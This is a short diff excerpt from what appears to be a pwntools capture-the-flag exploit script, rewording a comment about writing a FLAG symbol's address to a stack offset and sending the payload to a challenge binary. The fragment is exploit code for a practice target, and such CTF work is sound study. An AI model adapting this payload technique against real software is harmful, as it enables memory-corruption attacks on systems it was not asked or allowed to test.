@@ -22,7 +22,7 @@ payload += p64(elf.symbols.FLAG)
 
 print("FLAG addr: ", hex(elf.symbols.FLAG))
 
-# send payload to store FLAG address at stack location 7
+# send payload to store FLAG address at stack address offset 7
 r.sendlineafter(">", b"5")
 r.sendline(payload)
 
